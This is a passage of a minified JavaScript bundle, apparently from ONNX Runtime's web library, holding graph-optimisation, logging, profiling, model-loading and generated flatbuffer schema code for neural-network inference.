i=0;i<this._allData.length;i++)if(-2!==this._allData[i].from||-1!==this._allOutputIndices.indexOf(i+offset)){if(offset>0){let ind=-1;void 0!==this._allData[i].from&&-1!==this._allData[i].from?(ind=this._nodes[this._allData[i].from].outputs.indexOf(i+offset),-1!==ind&&(this._nodes[this._allData[i].from].outputs[ind]=i)):(ind=this._allInputIndices.indexOf(i+offset),-1!==ind&&(this._allInputIndices[ind]=i)),this._allData[i].to.forEach((node=>{ind=this._nodes[node].inputs.indexOf(i+offset),-1!==ind&&(this._nodes[node].inputs[ind]=i)})),0===this._allData[i].to.length&&(ind=this._allOutputIndices.indexOf(i+offset),-1!==ind&&(this._allOutputIndices[ind]=i))}}else offset++,this._allData.splice(i,1),i--}deleteNode(nodeIndex){const node=this._nodes[nodeIndex];if(node.outputs.length>1)for(let i=1;i<node.outputs.length;i++)if(this._allData[node.outputs[i]].to.length>0)throw new Error("Node deletion with more than one output connected to other nodes is not supported. ");node.executeNode=!1;const inputValueIndex=node.inputs[0],outputValueIndex=node.outputs[0],nodesConsumingOutput=this._allData[outputValueIndex].to;for(let i=0;i<node.inputs.length;i++){const delIndex=this._allData[node.inputs[i]].to.indexOf(nodeIndex);if(-1===delIndex)throw new Error("The Value object doesn't have the current Node in it's 'to' property ");this._allData[node.inputs[i]].to.splice(delIndex,1)}this._allData[outputValueIndex]._to=[];const index=this._allOutputIndices.indexOf(outputValueIndex);if(-1!==index&&(this._allOutputIndices[index]=inputValueIndex),nodesConsumingOutput&&nodesConsumingOutput.length>0)for(const nodeIndex of nodesConsumingOutput){const replaceIndex=this._nodes[nodeIndex].inputs.indexOf(outputValueIndex);if(-1===replaceIndex)throw new Error("The Node object doesn't have the output Value in it's 'inputs' property ");this._nodes[nodeIndex].inputs[replaceIndex]=inputValueIndex,this._allData[inputValueIndex].to.push(nodeIndex)}}removeAllDropoutNodes(){let nodeIndex=0;for(const node of this._nodes){if("Dropout"===node.opType){if(1!==node.inputs.length)throw new Error("Dropout nodes should only contain one input. ");if(1!==node.outputs.length&&2!==node.outputs.length)throw new Error("Dropout nodes should contain either 1 or 2 output(s)");if(2===node.outputs.length&&0!==this._allData[node.outputs[1]]._to.length)throw new Error("Dropout nodes's second output should not be referenced by other nodes");this.deleteNode(nodeIndex)}nodeIndex++}}removeAllIdentityNodes(){let nodeIndex=0;for(const node of this._nodes)"Identity"===node.opType&&this.deleteNode(nodeIndex),nodeIndex++}isActivation(n){switch(n.opType){case"Relu":case"Sigmoid":case"Clip":return!0;default:return!1}}fuseConvActivationNodes(){for(const node of this._nodes)if("Conv"===node.opType){const next=this._allData[node.outputs[0]]._to;if(1===next.length&&this.isActivation(this._nodes[next[0]])){const child=this._nodes[next[0]];if("Clip"===child.opType)if(1===child.inputs.length)try{node.attributes.set("activation_params","floats",[child.attributes.getFloat("min"),child.attributes.getFloat("max")])}catch(e){node.attributes.set("activation_params","floats",[util_1.MIN_CLIP,util_1.MAX_CLIP])}else{if(!(child.inputs.length>=3&&void 0!==this._allData[child.inputs[1]].tensor&&void 0!==this._allData[child.inputs[2]].tensor))continue;node.attributes.set("activation_params","floats",[this._allData[child.inputs[1]].tensor.floatData[0],this._allData[child.inputs[2]].tensor.floatData[0]])}node.attributes.set("activation","string",child.opType),this.deleteNode(next[0])}}}}},"./lib/onnxjs/instrument.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.now=exports.Profiler=exports.Logger=void 0;const SEVERITY_VALUE={verbose:1e3,info:2e3,warning:4e3,error:5e3,fatal:6e3},LOGGER_PROVIDER_MAP={none:new class NoOpLoggerProvider{log(_severity,_content,_category){}},console:new class ConsoleLoggerProvider{log(severity,content,category){console.log(`${this.color(severity)} ${category?"[35m"+category+"[0m ":""}${content}`)}color(severity){switch(severity){case"verbose":return"[34;40mv[0m";case"info":return"[32mi[0m";case"warning":return"[30;43mw[0m";case"error":return"[31;40me[0m";case"fatal":return"[101mf[0m";default:throw new Error(`unsupported severity: ${severity}`)}}}},LOGGER_DEFAULT_CONFIG={provider:"console",minimalSeverity:"warning",logDateTime:!0,logSourceLocation:!1};let LOGGER_CONFIG_MAP={"":LOGGER_DEFAULT_CONFIG};function log(arg0,arg1,arg2,arg3){if(void 0===arg1)return function createCategorizedLogger(category){return{verbose:log.verbose.bind(null,category),info:log.info.bind(null,category),warning:log.warning.bind(null,category),error:log.error.bind(null,category),fatal:log.fatal.bind(null,category)}}(arg0);if(void 0===arg2)logInternal(arg0,arg1,1);else if("number"==typeof arg2&&void 0===arg3)logInternal(arg0,arg1,arg2);else if("string"==typeof arg2&&void 0===arg3)logInternal(arg0,arg2,1,arg1);else{if("string"!=typeof arg2||"number"!=typeof arg3)throw new TypeError("input is valid");logInternal(arg0,arg2,arg3,arg1)}}function logInternal(severity,content,stack,category){const config=LOGGER_CONFIG_MAP[category||""]||LOGGER_CONFIG_MAP[""];SEVERITY_VALUE[severity]<SEVERITY_VALUE[config.minimalSeverity]||(config.logDateTime&&(content=`${(new Date).toISOString()}|${content}`),config.logSourceLocation,LOGGER_PROVIDER_MAP[config.provider].log(severity,content,category))}!function(log){function reset(config){LOGGER_CONFIG_MAP={},set("",config||{})}function set(category,config){if("*"===category)reset(config);else{const previousConfig=LOGGER_CONFIG_MAP[category]||LOGGER_DEFAULT_CONFIG;LOGGER_CONFIG_MAP[category]={provider:config.provider||previousConfig.provider,minimalSeverity:config.minimalSeverity||previousConfig.minimalSeverity,logDateTime:void 0===config.logDateTime?previousConfig.logDateTime:config.logDateTime,logSourceLocation:void 0===config.logSourceLocation?previousConfig.logSourceLocation:config.logSourceLocation}}}log.verbose=function verbose(arg0,arg1){log("verbose",arg0,arg1)},log.info=function info(arg0,arg1){log("info",arg0,arg1)},log.warning=function warning(arg0,arg1){log("warning",arg0,arg1)},log.error=function error(arg0,arg1){log("error",arg0,arg1)},log.fatal=function fatal(arg0,arg1){log("fatal",arg0,arg1)},log.reset=reset,log.set=set,log.setWithEnv=function setWithEnv(env){const config={};env.logLevel&&(config.minimalSeverity=env.logLevel),set("",config)}}(log||(log={})),exports.Logger=log;class Event{constructor(category,name,startTime,endCallback,timer,ctx){this.category=category,this.name=name,this.startTime=startTime,this.endCallback=endCallback,this.timer=timer,this.ctx=ctx}async end(){return this.endCallback(this)}async checkTimer(){if(void 0===this.ctx||void 0===this.timer)throw new Error("No webgl timer found");return this.ctx.endTimer(),this.ctx.waitForQueryAndGetTime(this.timer)}}class EventRecord{constructor(category,name,startTime,endTime){this.category=category,this.name=name,this.startTime=startTime,this.endTime=endTime}}exports.Profiler=class Profiler{static create(config){return void 0===config?new this:new this(config.maxNumberEvents,config.flushBatchSize,config.flushIntervalInMilliseconds)}constructor(maxNumberEvents,flushBatchSize,flushIntervalInMilliseconds){this._started=!1,this._flushPointer=0,this._started=!1,this._maxNumberEvents=void 0===maxNumberEvents?1e4:maxNumberEvents,this._flushBatchSize=void 0===flushBatchSize?10:flushBatchSize,this._flushIntervalInMilliseconds=void 0===flushIntervalInMilliseconds?5e3:flushIntervalInMilliseconds}start(){this._started=!0,this._timingEvents=[],this._flushTime=(0,exports.now)(),this._flushPointer=0}stop(){for(this._started=!1;this._flushPointer<this._timingEvents.length;this._flushPointer++)this.logOneEvent(this._timingEvents[this._flushPointer])}event(category,name,func,ctx){const event=this._started?this.begin(category,name,ctx):void 0;let isPromise=!1;const res=func();if(res&&"function"==typeof res.then)return isPromise=!0,new Promise(((resolve,reject)=>{res.then((async value=>{event&&await event.end(),resolve(value)}),(async reason=>{event&&await event.end(),reject(reason)}))}));if(!isPromise&&event){const eventRes=event.end();if(eventRes&&"function"==typeof eventRes.then)return new Promise(((resolve,reject)=>{eventRes.then((()=>{resolve(res)}),(reason=>{reject(reason)}))}))}return res}begin(category,name,ctx){if(!this._started)throw new Error("profiler is not started yet");if(void 0===ctx){const startTime=(0,exports.now)();return this.flush(startTime),new Event(category,name,startTime,(e=>this.endSync(e)))}{const timer=ctx.beginTimer();return new Event(category,name,0,(async e=>this.end(e)),timer,ctx)}}async end(event){const endTime=await event.checkTimer();this._timingEvents.length<this._maxNumberEvents&&(this._timingEvents.push(new EventRecord(event.category,event.name,event.startTime,endTime)),this.flush(endTime))}endSync(event){const endTime=(0,exports.now)();this._timingEvents.length<this._maxNumberEvents&&(this._timingEvents.push(new EventRecord(event.category,event.name,event.startTime,endTime)),this.flush(endTime))}logOneEvent(event){exports.Logger.verbose(`Profiler.${event.category}`,`${(event.endTime-event.startTime).toFixed(2)}ms on event '${event.name}' at ${event.endTime.toFixed(2)}`)}flush(currentTime){if(this._timingEvents.length-this._flushPointer>=this._flushBatchSize||currentTime-this._flushTime>=this._flushIntervalInMilliseconds){for(const previousPointer=this._flushPointer;this._flushPointer<previousPointer+this._flushBatchSize&&this._flushPointer<this._timingEvents.length;this._flushPointer++)this.logOneEvent(this._timingEvents[this._flushPointer]);this._flushTime=(0,exports.now)()}}get started(){return this._started}},exports.now="undefined"!=typeof performance&&performance.now?()=>performance.now():Date.now},"./lib/onnxjs/model.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Model=void 0;const flatbuffers_1=__webpack_require__("./node_modules/flatbuffers/js/flatbuffers.mjs"),graph_1=__webpack_require__("./lib/onnxjs/graph.ts"),ort_generated_1=__webpack_require__("./lib/onnxjs/ort-schema/flatbuffers/ort-generated.ts"),onnx_1=__webpack_require__("./lib/onnxjs/ort-schema/protobuf/onnx.js"),util_1=__webpack_require__("./lib/onnxjs/util.ts");var ortFbs=ort_generated_1.onnxruntime.experimental.fbs;exports.Model=class Model{constructor(){}load(buf,graphInitializer,isOrtFormat){if(!isOrtFormat)try{return void this.loadFromOnnxFormat(buf,graphInitializer)}catch(e){if(void 0!==isOrtFormat)throw e}this.loadFromOrtFormat(buf,graphInitializer)}loadFromOnnxFormat(buf,graphInitializer){const modelProto=onnx_1.onnx.ModelProto.decode(buf);if(util_1.LongUtil.longToNumber(modelProto.irVersion)<3)throw new Error("only support ONNX model with IR_VERSION>=3");this._opsets=modelProto.opsetImport.map((i=>({domain:i.domain,version:util_1.LongUtil.longToNumber(i.version)}))),this._graph=graph_1.Graph.from(modelProto.graph,graphInitializer)}loadFromOrtFormat(buf,graphInitializer){const fb=new flatbuffers_1.flatbuffers.ByteBuffer(buf),ortModel=ortFbs.InferenceSession.getRootAsInferenceSession(fb).model();if(util_1.LongUtil.longToNumber(ortModel.irVersion())<3)throw new Error("only support ONNX model with IR_VERSION>=3");this._opsets=[];for(let i=0;i<ortModel.opsetImportLength();i++){const opsetId=ortModel.opsetImport(i);this._opsets.push({domain:null==opsetId?void 0:opsetId.domain(),version:util_1.LongUtil.longToNumber(opsetId.version())})}this._graph=graph_1.Graph.from(ortModel.graph(),graphInitializer)}get graph(){return this._graph}get opsets(){return this._opsets}}},"./lib/onnxjs/operators.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.FLOAT_TYPES=exports.INT_TYPES=exports.NUMBER_TYPES=void 0,exports.NUMBER_TYPES=["float32","float64","int32","int16","int8","uint16","uint32","uint8"],exports.INT_TYPES=["int32","int16","int8","uint16","uint32","uint8"],exports.FLOAT_TYPES=["float32","float64"]},"./lib/onnxjs/opset.ts":(__unused_webpack_module,exports)=>{"use strict";function matchSelector(version,selector){if(selector.endsWith("+")){const rangeStart=Number.parseInt(selector.substring(0,selector.length-1),10);return!isNaN(rangeStart)&&rangeStart<=version}if(2===selector.split("-").length){const pair=selector.split("-"),rangeStart=Number.parseInt(pair[0],10),rangeEnd=Number.parseInt(pair[1],10);return!isNaN(rangeStart)&&!isNaN(rangeEnd)&&rangeStart<=version&&version<=rangeEnd}return Number.parseInt(selector,10)===version}Object.defineProperty(exports,"__esModule",{value:!0}),exports.resolveOperator=void 0,exports.resolveOperator=function resolveOperator(node,opsets,rules){for(const rule of rules){const opType=rule[0],domain=rule[1],versionSelector=rule[2],opImpl=rule[3],opInit=rule[4];if(node.opType===opType)for(const opset of opsets)if((opset.domain===domain||"ai.onnx"===opset.domain&&""===domain)&&matchSelector(opset.version,versionSelector))return{opImpl:opImpl,opInit:opInit}}throw new TypeError(`cannot resolve operator '${node.opType}' with opsets: ${opsets.map((set=>`${set.domain||"ai.onnx"} v${set.version}`)).join(", ")}`)}},"./lib/onnxjs/ort-schema/flatbuffers/ort-generated.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.onnxruntime=void 0;const flatbuffers_1=__webpack_require__("./node_modules/flatbuffers/js/flatbuffers.mjs");!function(onnxruntime){!function(experimental){!function(fbs){let AttributeType;!function(AttributeType){AttributeType[AttributeType.UNDEFINED=0]="UNDEFINED",AttributeType[AttributeType.FLOAT=1]="FLOAT",AttributeType[AttributeType.INT=2]="INT",AttributeType[AttributeType.STRING=3]="STRING",AttributeType[AttributeType.TENSOR=4]="TENSOR",AttributeType[AttributeType.GRAPH=5]="GRAPH",AttributeType[AttributeType.FLOATS=6]="FLOATS",AttributeType[AttributeType.INTS=7]="INTS",AttributeType[AttributeType.STRINGS=8]="STRINGS",AttributeType[AttributeType.TENSORS=9]="TENSORS",AttributeType[AttributeType.GRAPHS=10]="GRAPHS",AttributeType[AttributeType.SPARSE_TENSOR=11]="SPARSE_TENSOR",AttributeType[AttributeType.SPARSE_TENSORS=12]="SPARSE_TENSORS"}(AttributeType=fbs.AttributeType||(fbs.AttributeType={}))}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){let DimensionValueType;!function(DimensionValueType){DimensionValueType[DimensionValueType.UNKNOWN=0]="UNKNOWN",DimensionValueType[DimensionValueType.VALUE=1]="VALUE",DimensionValueType[DimensionValueType.PARAM=2]="PARAM"}(DimensionValueType=fbs.DimensionValueType||(fbs.DimensionValueType={}))}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){let TensorDataType;!function(TensorDataType){TensorDataType[TensorDataType.UNDEFINED=0]="UNDEFINED",TensorDataType[TensorDataType.FLOAT=1]="FLOAT",TensorDataType[TensorDataType.UINT8=2]="UINT8",TensorDataType[TensorDataType.INT8=3]="INT8",TensorDataType[TensorDataType.UINT16=4]="UINT16",TensorDataType[TensorDataType.INT16=5]="INT16",TensorDataType[TensorDataType.INT32=6]="INT32",TensorDataType[TensorDataType.INT64=7]="INT64",TensorDataType[TensorDataType.STRING=8]="STRING",TensorDataType[TensorDataType.BOOL=9]="BOOL",TensorDataType[TensorDataType.FLOAT16=10]="FLOAT16",TensorDataType[TensorDataType.DOUBLE=11]="DOUBLE",TensorDataType[TensorDataType.UINT32=12]="UINT32",TensorDataType[TensorDataType.UINT64=13]="UINT64",TensorDataType[TensorDataType.COMPLEX64=14]="COMPLEX64",TensorDataType[TensorDataType.COMPLEX128=15]="COMPLEX128",TensorDataType[TensorDataType.BFLOAT16=16]="BFLOAT16",TensorDataType[TensorDataType.FLOAT8E4M3FN=17]="FLOAT8E4M3FN",TensorDataType[TensorDataType.FLOAT8E4M3FNUZ=18]="FLOAT8E4M3FNUZ",TensorDataType[TensorDataType.FLOAT8E5M2=19]="FLOAT8E5M2",TensorDataType[TensorDataType.FLOAT8E5M2FNUZ=20]="FLOAT8E5M2FNUZ"}(TensorDataType=fbs.TensorDataType||(fbs.TensorDataType={}))}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){let NodeType;!function(NodeType){NodeType[NodeType.Primitive=0]="Primitive",NodeType[NodeType.Fused=1]="Fused"}(NodeType=fbs.NodeType||(fbs.NodeType={}))}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){let TypeInfoValue;!function(TypeInfoValue){TypeInfoValue[TypeInfoValue.NONE=0]="NONE",TypeInfoValue[TypeInfoValue.tensor_type=1]="tensor_type",TypeInfoValue[TypeInfoValue.sequence_type=2]="sequence_type",TypeInfoValue[TypeInfoValue.map_type=3]="map_type"}(TypeInfoValue=fbs.TypeInfoValue||(fbs.TypeInfoValue={}))}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Shape{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsShape(bb,obj){return(obj||new Shape).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsShape(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Shape).__init(bb.readInt32(bb.position())+bb.position(),bb)}dim(index,obj){let offset=this.bb.__offset(this.bb_pos,4);return offset?(obj||new onnxruntime.experimental.fbs.Dimension).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}dimLength(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startShape(builder){builder.startObject(1)}static addDim(builder,dimOffset){builder.addFieldOffset(0,dimOffset,0)}static createDimVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startDimVector(builder,numElems){builder.startVector(4,numElems,4)}static endShape(builder){return builder.endObject()}static createShape(builder,dimOffset){return Shape.startShape(builder),Shape.addDim(builder,dimOffset),Shape.endShape(builder)}}fbs.Shape=Shape}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Dimension{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsDimension(bb,obj){return(obj||new Dimension).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsDimension(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Dimension).__init(bb.readInt32(bb.position())+bb.position(),bb)}value(obj){let offset=this.bb.__offset(this.bb_pos,4);return offset?(obj||new onnxruntime.experimental.fbs.DimensionValue).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}denotation(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}static startDimension(builder){builder.startObject(2)}static addValue(builder,valueOffset){builder.addFieldOffset(0,valueOffset,0)}static addDenotation(builder,denotationOffset){builder.addFieldOffset(1,denotationOffset,0)}static endDimension(builder){return builder.endObject()}static createDimension(builder,valueOffset,denotationOffset){return Dimension.startDimension(builder),Dimension.addValue(builder,valueOffset),Dimension.addDenotation(builder,denotationOffset),Dimension.endDimension(builder)}}fbs.Dimension=Dimension}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class DimensionValue{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsDimensionValue(bb,obj){return(obj||new DimensionValue).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsDimensionValue(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new DimensionValue).__init(bb.readInt32(bb.position())+bb.position(),bb)}dimType(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.readInt8(this.bb_pos+offset):onnxruntime.experimental.fbs.DimensionValueType.UNKNOWN}dimValue(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.readInt64(this.bb_pos+offset):this.bb.createLong(0,0)}dimParam(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}static startDimensionValue(builder){builder.startObject(3)}static addDimType(builder,dimType){builder.addFieldInt8(0,dimType,onnxruntime.experimental.fbs.DimensionValueType.UNKNOWN)}static addDimValue(builder,dimValue){builder.addFieldInt64(1,dimValue,builder.createLong(0,0))}static addDimParam(builder,dimParamOffset){builder.addFieldOffset(2,dimParamOffset,0)}static endDimensionValue(builder){return builder.endObject()}static createDimensionValue(builder,dimType,dimValue,dimParamOffset){return DimensionValue.startDimensionValue(builder),DimensionValue.addDimType(builder,dimType),DimensionValue.addDimValue(builder,dimValue),DimensionValue.addDimParam(builder,dimParamOffset),DimensionValue.endDimensionValue(builder)}}fbs.DimensionValue=DimensionValue}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class TensorTypeAndShape{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsTensorTypeAndShape(bb,obj){return(obj||new TensorTypeAndShape).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsTensorTypeAndShape(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new TensorTypeAndShape).__init(bb.readInt32(bb.position())+bb.position(),bb)}elemType(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.readInt32(this.bb_pos+offset):onnxruntime.experimental.fbs.TensorDataType.UNDEFINED}shape(obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.Shape).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}static startTensorTypeAndShape(builder){builder.startObject(2)}static addElemType(builder,elemType){builder.addFieldInt32(0,elemType,onnxruntime.experimental.fbs.TensorDataType.UNDEFINED)}static addShape(builder,shapeOffset){builder.addFieldOffset(1,shapeOffset,0)}static endTensorTypeAndShape(builder){return builder.endObject()}static createTensorTypeAndShape(builder,elemType,shapeOffset){return TensorTypeAndShape.startTensorTypeAndShape(builder),TensorTypeAndShape.addElemType(builder,elemType),TensorTypeAndShape.addShape(builder,shapeOffset),TensorTypeAndShape.endTensorTypeAndShape(builder)}}fbs.TensorTypeAndShape=TensorTypeAndShape}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class MapType{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsMapType(bb,obj){return(obj||new MapType).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsMapType(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new MapType).__init(bb.readInt32(bb.position())+bb.position(),bb)}keyType(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.readInt32(this.bb_pos+offset):onnxruntime.experimental.fbs.TensorDataType.UNDEFINED}valueType(obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.TypeInfo).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}static startMapType(builder){builder.startObject(2)}static addKeyType(builder,keyType){builder.addFieldInt32(0,keyType,onnxruntime.experimental.fbs.TensorDataType.UNDEFINED)}static addValueType(builder,valueTypeOffset){builder.addFieldOffset(1,valueTypeOffset,0)}static endMapType(builder){return builder.endObject()}static createMapType(builder,keyType,valueTypeOffset){return MapType.startMapType(builder),MapType.addKeyType(builder,keyType),MapType.addValueType(builder,valueTypeOffset),MapType.endMapType(builder)}}fbs.MapType=MapType}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class SequenceType{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsSequenceType(bb,obj){return(obj||new SequenceType).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsSequenceType(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new SequenceType).__init(bb.readInt32(bb.position())+bb.position(),bb)}elemType(obj){let offset=this.bb.__offset(this.bb_pos,4);return offset?(obj||new onnxruntime.experimental.fbs.TypeInfo).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}static startSequenceType(builder){builder.startObject(1)}static addElemType(builder,elemTypeOffset){builder.addFieldOffset(0,elemTypeOffset,0)}static endSequenceType(builder){return builder.endObject()}static createSequenceType(builder,elemTypeOffset){return SequenceType.startSequenceType(builder),SequenceType.addElemType(builder,elemTypeOffset),SequenceType.endSequenceType(builder)}}fbs.SequenceType=SequenceType}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){fbs.EdgeEnd=class EdgeEnd{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}nodeIndex(){return this.bb.readUint32(this.bb_pos)}srcArgIndex(){return this.bb.readInt32(this.bb_pos+4)}dstArgIndex(){return this.bb.readInt32(this.bb_pos+8)}static createEdgeEnd(builder,node_index,src_arg_index,dst_arg_index){return builder.prep(4,12),builder.writeInt32(dst_arg_index),builder.writeInt32(src_arg_index),builder.writeInt32(node_index),builder.offset()}}}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class NodeEdge{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsNodeEdge(bb,obj){return(obj||new NodeEdge).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsNodeEdge(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new NodeEdge).__init(bb.readInt32(bb.position())+bb.position(),bb)}nodeIndex(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.readUint32(this.bb_pos+offset):0}inputEdges(index,obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.EdgeEnd).__init(this.bb.__vector(this.bb_pos+offset)+12*index,this.bb):null}inputEdgesLength(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__vector_len(this.bb_pos+offset):0}outputEdges(index,obj){let offset=this.bb.__offset(this.bb_pos,8);return offset?(obj||new onnxruntime.experimental.fbs.EdgeEnd).__init(this.bb.__vector(this.bb_pos+offset)+12*index,this.bb):null}outputEdgesLength(){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startNodeEdge(builder){builder.startObject(3)}static addNodeIndex(builder,nodeIndex){builder.addFieldInt32(0,nodeIndex,0)}static addInputEdges(builder,inputEdgesOffset){builder.addFieldOffset(1,inputEdgesOffset,0)}static startInputEdgesVector(builder,numElems){builder.startVector(12,numElems,4)}static addOutputEdges(builder,outputEdgesOffset){builder.addFieldOffset(2,outputEdgesOffset,0)}static startOutputEdgesVector(builder,numElems){builder.startVector(12,numElems,4)}static endNodeEdge(builder){return builder.endObject()}static createNodeEdge(builder,nodeIndex,inputEdgesOffset,outputEdgesOffset){return NodeEdge.startNodeEdge(builder),NodeEdge.addNodeIndex(builder,nodeIndex),NodeEdge.addInputEdges(builder,inputEdgesOffset),NodeEdge.addOutputEdges(builder,outputEdgesOffset),NodeEdge.endNodeEdge(builder)}}fbs.NodeEdge=NodeEdge}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Node{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsNode(bb,obj){return(obj||new Node).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsNode(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Node).__init(bb.readInt32(bb.position())+bb.position(),bb)}name(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}docString(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}domain(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}sinceVersion(){let offset=this.bb.__offset(this.bb_pos,10);return offset?this.bb.readInt32(this.bb_pos+offset):0}index(){let offset=this.bb.__offset(this.bb_pos,12);return offset?this.bb.readUint32(this.bb_pos+offset):0}opType(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}type(){let offset=this.bb.__offset(this.bb_pos,16);return 